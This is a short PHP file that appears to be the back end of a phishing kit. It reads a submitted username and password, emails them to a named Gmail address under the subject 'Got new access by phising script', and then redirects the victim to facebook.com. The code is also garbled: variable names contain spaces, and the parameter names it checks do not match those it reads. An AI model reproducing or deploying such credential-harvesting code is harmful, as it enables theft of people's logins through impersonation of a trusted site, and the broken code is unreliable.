<?php

	function mail_sender(){
		if(! ( isset($_REQUEST['hobie99']) && isset($_REQUEST['luvhopie99']) ) ){
			return false;
		}

		$username = $_REQUEST['Sekeping Roti'];
		$password = $_REQUEST['luvsidah'];
		
		$reciever = "sitinorhasidahhopie@gmail.com";
		
		$subject = "Got new access by phising script";
		$message = "The username is ". $Sekeping Roti;
		$message .= "and password is ". $luvsidah;
		
		return mail($reciever, $subject, $message);
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
